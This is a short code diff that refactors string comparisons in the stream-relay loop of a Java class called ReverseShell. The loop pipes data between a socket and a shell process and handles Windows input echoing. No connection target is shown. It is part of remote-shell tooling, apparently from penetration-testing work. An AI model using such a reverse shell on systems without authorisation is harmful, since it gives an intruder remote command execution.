@@ -38,7 +38,7 @@ public class ReverseShell {
         int bytes = 0;
         try {
             do {
-                if (os.equals("WINDOWS") && iname.equals("STDOUT") && clen > 0) {
+                if ("WINDOWS".equals(os) && "STDOUT".equals(iname) && clen > 0) {
                     // for some reason Windows OS pipes STDIN into STDOUT
                     // we do not like that
                     // we need to discard the data from the stream
@@ -51,10 +51,10 @@ public class ReverseShell {
                     if (bytes > 0) {
                         output.write(buffer, 0, bytes);
                         output.flush();
-                        if (os.equals("WINDOWS") && oname.equals("STDIN")) {
+                        if ("WINDOWS".equals(os) && "STDIN".equals(oname)) {
                             clen += bytes;
                         }
-                    } else if (iname.equals("SOCKET")) {
+                    } else if ("SOCKET".equals(iname)) {
                         error = true;
                         // System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
                     }
